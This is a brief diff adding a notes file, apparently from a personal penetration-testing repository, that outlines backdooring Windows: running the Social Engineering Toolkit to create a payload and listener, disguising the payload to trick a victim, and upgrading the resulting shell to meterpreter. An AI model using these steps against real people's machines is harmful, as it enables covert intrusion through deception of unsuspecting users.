@@ -1,0 +1,13 @@
+[METERPRETER] Backdooring Windows
+
+Use Social Engineering toolkit to create a payload and listener.
+
+	sudo setoolkit
+	Select 1: Social Engineering Attacks
+	Select 4: Create a Payload and Listener
+	Go through steps
+
+Disguise payload however possible
+
+When payload is executed, a shell will be created. To upgrade shell to
+meterpreter, follow manual in this repository.
